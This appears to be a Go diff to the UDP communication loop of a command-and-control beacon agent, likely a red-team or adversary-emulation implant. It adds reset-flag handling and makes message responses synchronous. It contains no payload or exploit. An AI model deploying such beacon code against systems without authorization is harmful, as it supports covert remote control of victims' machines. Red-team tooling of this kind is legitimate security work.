@@ -26,6 +26,10 @@ func (contact UDP) Communicate(agent *util.AgentConfig, beacon Beacon) {
 	   		log.Printf("[-] %s is either unavailable or a firewall is blocking traffic.", agent.Address)
 	   	} else {
 	   		udpListen(conn, beacon, agent)
+			if util.ResetFlag {
+				ResetChan<-0
+				break
+			}
 	   	}
 	   	jitterSleep(agent.Sleep, "UDP")
 	}
@@ -39,7 +43,10 @@ func udpListen(conn net.Conn, beacon Beacon, agent *util.AgentConfig) {
     scanner := bufio.NewScanner(conn)
     for scanner.Scan() {
 		message := strings.TrimSpace(scanner.Text())
-		go udpRespond(conn, beacon, message, agent)
+		udpRespond(conn, beacon, message, agent)
+		if util.ResetFlag {
+			return
+		}
     }
 }
 
@@ -60,6 +67,10 @@ func udpRespond(conn net.Conn, beacon Beacon, message string, agent *util.AgentC
 	}
 	pwd, _ := os.Getwd()
 	beacon.Pwd = pwd
+	if util.ResetFlag {
+		ResetBeacon = beacon
+		return
+	}
 	udpBufferedSend(conn, beacon)
 }
 
